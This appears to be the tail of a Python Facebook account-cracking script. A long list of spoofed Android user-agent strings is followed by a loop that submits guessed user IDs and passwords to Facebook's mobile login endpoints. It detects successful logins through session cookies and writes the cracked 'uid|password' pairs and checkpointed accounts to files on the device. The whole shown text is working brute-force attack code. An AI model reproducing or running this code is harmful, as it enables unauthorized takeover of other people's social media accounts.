Chrome/54.0.3383.166 Mobile Safari/533.9','Mozilla/5.0 (Linux; U; Android 4.4.1; Nexus S 4G Build/GRJ22) AppleWebKit/537.11 (KHTML, like Gecko)  Chrome/48.0.2467.391 Mobile Safari/602.6','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-T285s Build/JSS15J) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/53.0.1959.166 Mobile Safari/537.4','Mozilla/5.0 (Linux; U; Android 5.0; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/603.34 (KHTML, like Gecko)  Chrome/53.0.1396.109 Mobile Safari/600.1','Mozilla/5.0 (Linux; U; Android 4.4; SM-G9009D Build/KOT49H) AppleWebKit/536.17 (KHTML, like Gecko)  Chrome/49.0.1370.351 Mobile Safari/533.4','Mozilla/5.0 (Android; Android 5.0.2; Lenovo A7000-a Build/LRX21M;) AppleWebKit/537.39 (KHTML, like Gecko)  Chrome/54.0.3127.314 Mobile Safari/536.0','Mozilla/5.0 (Linux; Android 4.4; IQ4500 Quad Build/KOT49H) AppleWebKit/535.47 (KHTML, like Gecko)  Chrome/52.0.3683.391 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 5.0; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/536.20 (KHTML, like Gecko)  Chrome/55.0.3563.114 Mobile Safari/603.5','Mozilla/5.0 (Linux; Android 4.3.1; GT-I9300 Build/JDQ39) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/48.0.3987.116 Mobile Safari/601.9','Mozilla/5.0 (Android; Android 5.1.1; SM-G935FG Build/MMB29M) AppleWebKit/603.46 (KHTML, like Gecko)  Chrome/55.0.1573.333 Mobile Safari/534.9','Mozilla/5.0 (Linux; U; Android 5.0; SM-T815 Build/LRX22G) AppleWebKit/603.38 (KHTML, like Gecko)  Chrome/49.0.2974.184 Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android 4.4; [HM NOTE|NOTE-III|NOTE2 1LTETD) AppleWebKit/603.1 (KHTML, like Gecko)  Chrome/55.0.2124.388 Mobile Safari/537.9','Mozilla/5.0 (Android; Android 5.0; LG-D707 Build/LRX22G) AppleWebKit/534.23 (KHTML, like Gecko)  Chrome/52.0.1989.353 Mobile Safari/536.8','Mozilla/5.0 (Linux; Android 5.1; MOTO G Build/LPD23) AppleWebKit/600.4 (KHTML, like Gecko)  Chrome/47.0.3252.139 Mobile Safari/535.6','Mozilla/5.0 (Linux; U; Android 4.4.4; SM-N9008 Build/KOT49H) AppleWebKit/534.22 (KHTML, like Gecko)  Chrome/49.0.2297.157 Mobile Safari/533.2','Mozilla/5.0 (Linux; Android 5.0; LG-D325 Build/LRX22G) AppleWebKit/603.28 (KHTML, like Gecko)  Chrome/48.0.1318.224 Mobile Safari/600.8','Mozilla/5.0 (Android; Android 7.1; GT-I9300 Build/KTU84P) AppleWebKit/600.39 (KHTML, like Gecko)  Chrome/55.0.3848.280 Mobile Safari/600.9','Mozilla/5.0 (Android; Android 5.0.2; SAMSUNG-SM-N915F Build/LRX22C) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/49.0.3082.226 Mobile Safari/602.2','Mozilla/5.0 (Linux; Android 7.1.1; Pixel XL Build/NRD90M) AppleWebKit/602.11 (KHTML, like Gecko)  Chrome/55.0.3078.102 Mobile Safari/534.5Mozilla/5.0 (Linux; Android 4.3.1; Samsung Galaxy S4 Mega GT-I9100 Build/JDQ39) AppleWebKit/537.47 (KHTML, like Gecko)  Chrome/55.0.2519.276 Mobile Safari/533.2','Mozilla/5.0 (Linux; U; Android 7.1; LG-H930 Build/NRD90M) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/55.0.2095.142 Mobile Safari/601.4','Mozilla/5.0 (Linux; U; Android 7.0; Xperia Build/NDE63X) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/51.0.3430.113 Mobile Safari/537.7','Mozilla/5.0 (Android; Android 4.4; HTC One_M9 Build/KTU84L) AppleWebKit/533.19 (KHTML, like Gecko)  Chrome/51.0.2068.113 Mobile Safari/602.2','Mozilla/5.0 (Android; Android 7.1.1; Nexus 9 Build/NME91E) AppleWebKit/534.18 (KHTML, like Gecko)  Chrome/55.0.3107.184 Mobile Safari/534.4','Mozilla/5.0 (Linux; U; Android 5.0.1; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/535.10 (KHTML, like Gecko)  Chrome/55.0.3562.367 Mobile Safari/533.9','Mozilla/5.0 (Android; Android 4.3.1; SM-G350V Build/JLS36C) AppleWebKit/537.13 (KHTML, like Gecko)  Chrome/52.0.1635.166 Mobile Safari/533.7','Mozilla/5.0 (Linux; U; Android 5.0; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/601.20 (KHTML, like Gecko)  Chrome/52.0.2392.375 Mobile Safari/603.9','Mozilla/5.0 (Android; Android 5.0.1; HTC Butterfly S 901 Build/LRX22G) AppleWebKit/533.17 (KHTML, like Gecko)  Chrome/55.0.1715.201 Mobile Safari/603.0','Mozilla/5.0 (Linux; Android 5.0.1; LG-D329 Build/LRX22G) AppleWebKit/537.37 (KHTML, like Gecko)  Chrome/54.0.2695.379 Mobile Safari/600.0','Mozilla/5.0 (Linux; U; Android 5.1.1; SAMSUNG SM-G9350L Build/LMY47X) AppleWebKit/602.13 (KHTML, like Gecko)  Chrome/54.0.1854.147 Mobile Safari/534.3','Mozilla/5.0 (Android; Android 5.0; SAMSUNG SM-T805 Build/LRX22G) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/49.0.2037.254 Mobile Safari/535.8','Mozilla/5.0 (Linux; U; Android 4.4.1; LG-D470 Build/KOT49I) AppleWebKit/600.24 (KHTML, like Gecko)  Chrome/49.0.1559.127 Mobile Safari/602.9','Mozilla/5.0 (Linux; U; Android 4.4.4; SAMSUNG SM-J100G Build/KTU84P) AppleWebKit/536.42 (KHTML, like Gecko)  Chrome/48.0.1081.174 Mobile Safari/600.9','Mozilla/5.0 (Android; Android 6.0.1; Nexus 6X Build/MDB08L) AppleWebKit/533.2 (KHTML, like Gecko)  Chrome/54.0.2809.359 Mobile Safari/536.3','Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MMB29V) AppleWebKit/601.8 (KHTML, like Gecko)  Chrome/55.0.1211.230 Mobile Safari/600.4','Mozilla/5.0 (Linux; U; Android 4.4; SAMSUNG SM-E500F Build/KTU84P) AppleWebKit/537.40 (KHTML, like Gecko)  Chrome/54.0.2476.336 Mobile Safari/537.1','Mozilla/5.0 (Linux; U; Android 4.3.1; Nokia 3310 Build/IMM76D) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/51.0.1844.294 Mobile Safari/603.2','Mozilla/5.0 (Linux; U; Android 5.0.2; SAMSUNG-SM-N915FY Build/LRX22C) AppleWebKit/533.16 (KHTML, like Gecko)  Chrome/54.0.2341.124 Mobile Safari/602.6','Mozilla/5.0 (Android; Android 5.1; SAMSUNG SM-G9358 Build/LMY47X) AppleWebKit/600.22 (KHTML, like Gecko)  Chrome/52.0.2619.266 Mobile Safari/536.3','Mozilla/5.0 (Android; Android 5.1.1; SM-G920F-ORANGE Build/LMY47X) AppleWebKit/600.32 (KHTML, like Gecko)  Chrome/48.0.3651.378 Mobile Safari/537.1','Mozilla/5.0 (Linux; U; Android 5.0.1; SAMSUNG SM-A700F Build/LMY47X) AppleWebKit/536.6 (KHTML, like Gecko)  Chrome/51.0.3595.208 Mobile Safari/600.6','Mozilla/5.0 (Linux; U; Android 7.0; Pixel XL Build/NME91E) AppleWebKit/601.6 (KHTML, like Gecko)  Chrome/53.0.2236.141 Mobile Safari/537.2','Mozilla/5.0 (Android; Android 5.0.2; SM-P550 Build/LRX22G) AppleWebKit/601.44 (KHTML, like Gecko)  Chrome/54.0.1590.322 Mobile Safari/602.6','Mozilla/5.0 (Android; Android 7.1.1; LG-H900 Build/NRD90M) AppleWebKit/603.8 (KHTML, like Gecko)  Chrome/55.0.3714.296 Mobile Safari/533.4','Mozilla/5.0 (Linux; U; Android 7.0; LG-H920 Build/NRD90M) AppleWebKit/603.44 (KHTML, like Gecko)  Chrome/48.0.1661.317 Mobile Safari/536.7','Mozilla/5.0 (Android; Android 5.0.2; LG-D721 Build/LRX22G) AppleWebKit/603.18 (KHTML, like Gecko)  Chrome/49.0.1072.135 Mobile Safari/601.3','Mozilla/5.0 (Android; Android 7.1; Pixel C Build/NRD90M) AppleWebKit/600.10 (KHTML, like Gecko)  Chrome/50.0.1022.234 Mobile Safari/602.0','Mozilla/5.0 (Linux; Android 6.0.1; HTC One M9 Build/MRA58K) AppleWebKit/535.29 (KHTML, like Gecko)  Chrome/48.0.3087.387 Mobile Safari/535.6','Mozilla/5.0 (Android; Android 5.1; Nexus 6 Build/LMY48B) AppleWebKit/533.50 (KHTML, like Gecko)  Chrome/48.0.3216.277 Mobile Safari/533.5','Mozilla/5.0 (Linux; U; Android 5.0.1; SAMSUNG SM-G9008 Build/KTU84F) AppleWebKit/603.46 (KHTML, like Gecko)  Chrome/52.0.2000.352 Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android 4.4.1; Elephone P6000 Build/KTU84P) AppleWebKit/537.21 (KHTML, like Gecko)  Chrome/54.0.1268.206 Mobile Safari/534.5','Mozilla/5.0 (Linux; Android 6.0; SAMSUNG SM-D9288 Build/MDB08I) AppleWebKit/533.3 (KHTML, like Gecko)  Chrome/53.0.2233.295 Mobile Safari/537.4','Mozilla/5.0 (Android; Android 5.0.1; SM-P550 Build/LRX22G) AppleWebKit/603.33 (KHTML, like Gecko)  Chrome/49.0.2381.330 Mobile Safari/601.8','Mozilla/5.0 (Linux; Android 4.4.1; XT1019 Build/[KXB20.9|KXC21.5]) AppleWebKit/535.43 (KHTML, like Gecko)  Chrome/52.0.2381.169 Mobile Safari/602.3','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-T255s Build/JSS15J) AppleWebKit/534.16 (KHTML, like Gecko)  Chrome/48.0.3984.232 Mobile Safari/535.5','Mozilla/5.0 (Linux; Android 4.3.1; Ascend G330 Build/JLS36I) AppleWebKit/601.50 (KHTML, like Gecko)  Chrome/48.0.3032.154 Mobile Safari/535.7','Mozilla/5.0 (Linux; U; Android 5.1; SM-G935FD Build/LMY47X) AppleWebKit/600.15 (KHTML, like Gecko)  Chrome/52.0.3560.217 Mobile Safari/600.6','Mozilla/5.0 (Linux; U; Android 5.0.2; SAMSUNG-SM-N910A Build/LRX22C) AppleWebKit/600.22 (KHTML, like Gecko)  Chrome/49.0.1571.375 Mobile Safari/535.5','Mozilla/5.0 (Linux; U; Android 5.0.1; LG-G839T Build/KOT49I) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/49.0.1398.145 Mobile Safari/601.5','Mozilla/5.0 (Linux; Android 4.3.1; Ascend G300 Build/JLS36I) AppleWebKit/537.41 (KHTML, like Gecko)  Chrome/55.0.2629.172 Mobile Safari/536.1','Mozilla/5.0 (Android; Android 7.1; Nexus 5X Build/NPD90G) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/50.0.1337.191 Mobile Safari/601.6','Mozilla/5.0 (Linux; U; Android 5.0; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/536.19 (KHTML, like Gecko)  Chrome/51.0.3810.121 Mobile Safari/537.1','Mozilla/5.0 (Android; Android 6.0; HTC One0P6B Build/MRA58K) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/48.0.2526.329 Mobile Safari/533.3','Mozilla/5.0 (Android; Android 4.4.4; Nexus5 V7.1 Build/KOT49H) AppleWebKit/600.14 (KHTML, like Gecko)  Chrome/53.0.1895.287 Mobile Safari/602.4','Mozilla/5.0 (Linux; U; Android 5.0.2; LG-D728 Build/LRX22G) AppleWebKit/535.50 (KHTML, like Gecko)  Chrome/49.0.1031.189 Mobile Safari/600.6','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SM-N915A Build/LRX22C) AppleWebKit/603.18 (KHTML, like Gecko)  Chrome/50.0.1072.349 Mobile Safari/535.2','Mozilla/5.0 (Linux; U; Android 5.1.1; Nexus 5 Build/LRX22C) AppleWebKit/535.16 (KHTML, like Gecko)  Chrome/51.0.1759.211 Mobile Safari/601.4','Mozilla/5.0 (Android; Android 7.0; Nexus 9 Build/NPD90G) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/47.0.3802.380 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 4.4; LG Optimus G Build/KRT16M) AppleWebKit/602.40 (KHTML, like Gecko)  Chrome/53.0.2136.107 Mobile Safari/534.9','Mozilla/5.0 (Android; Android 5.0; Nokia 1000 wifi Build/GRK39F) AppleWebKit/535.34 (KHTML, like Gecko)  Chrome/55.0.1140.285 Mobile Safari/535.8','Mozilla/5.0 (Linux; U; Android 5.0.1; SM-N915V Build/LRX22C) AppleWebKit/601.15 (KHTML, like Gecko)  Chrome/51.0.2335.291 Mobile Safari/603.5','Mozilla/5.0 (Android; Android 5.0; SM-N915G Build/LRX22C) AppleWebKit/602.44 (KHTML, like Gecko)  Chrome/54.0.1988.297 Mobile Safari/537.6','Mozilla/5.0 (Android; Android 7.1.1; Nexus 6X Build/NME91E) AppleWebKit/534.25 (KHTML, like Gecko)  Chrome/53.0.2916.266 Mobile Safari/603.2','Mozilla/5.0 (Android; Android 5.1; Nexus 9 Build/LRX22C) AppleWebKit/533.29 (KHTML, like Gecko)  Chrome/47.0.1513.324 Mobile Safari/600.0','Mozilla/5.0 (Android; Android 5.0; Nokia 1100 wifi Build/GRK39F) AppleWebKit/535.23 (KHTML, like Gecko)  Chrome/52.0.3465.248 Mobile Safari/603.3','Mozilla/5.0 (Linux; Android 4.4.4; Nexus5 V6.1 Build/KOT49H) AppleWebKit/537.3 (KHTML, like Gecko)  Chrome/53.0.2333.315 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 4.3.1; HTC One 801s Build/JSS15J) AppleWebKit/535.1 (KHTML, like Gecko)  Chrome/48.0.2317.315 Mobile Safari/603.6','Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LRX22C) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/47.0.1194.275 Mobile Safari/533.8','Mozilla/5.0 (Linux; Android 5.1; MOTOROLA MOTO XT1570 MOTO X STYLE Build/LPH223) AppleWebKit/601.30 (KHTML, like Gecko)  Chrome/51.0.3420.282 Mobile Safari/600.1','Mozilla/5.0 (Android; Android 7.1.1; SAMSUNG GT-I9300 Build/KTU84P) AppleWebKit/536.17 (KHTML, like Gecko)  Chrome/52.0.3825.121 Mobile Safari/601.9','Mozilla/5.0 (Linux; Android 5.1; MOTOROLA MOTO XT1580 Build/LPK23) AppleWebKit/536.32 (KHTML, like Gecko)  Chrome/54.0.1048.247 Mobile Safari/602.4','Mozilla/5.0 (Linux; U; Android 7.1; Nexus 7P Build/NME91E) AppleWebKit/601.44 (KHTML, like Gecko)  Chrome/51.0.2683.146 Mobile Safari/602.9','Mozilla/5.0 (Linux; U; Android 7.1.1; LG-H900 Build/NRD90C) AppleWebKit/535.22 (KHTML, like Gecko)  Chrome/50.0.1162.301 Mobile Safari/602.0','Mozilla/5.0 (Android; Android 6.0; Nexus 7 Build/MDB08I) AppleWebKit/535.38 (KHTML, like Gecko)  Chrome/50.0.3882.265 Mobile Safari/602.9','Mozilla/5.0 (Android; Android 4.4.1; E:number:20-23:01 Build/24.0.B.1.34) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/55.0.1040.349 Mobile Safari/537.7','Mozilla/5.0 (Android; Android 7.1; Nexus 9X Build/NPD90G) AppleWebKit/537.14 (KHTML, like Gecko)  Chrome/55.0.1777.272 Mobile Safari/600.4'])
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'p.facebook.com',
			'upgrade-insecure-requests': '1',
			'viewport-width': '980',
			'method': 'path',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
			'dnt':'1', 
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			"sec-ch-prefers-color-scheme": "light",
			'user-agent': ua}
			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [TRT-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [TRT-OK] '+uid+' | '+pas)
						open('/sdcard/TRT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[141:156]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()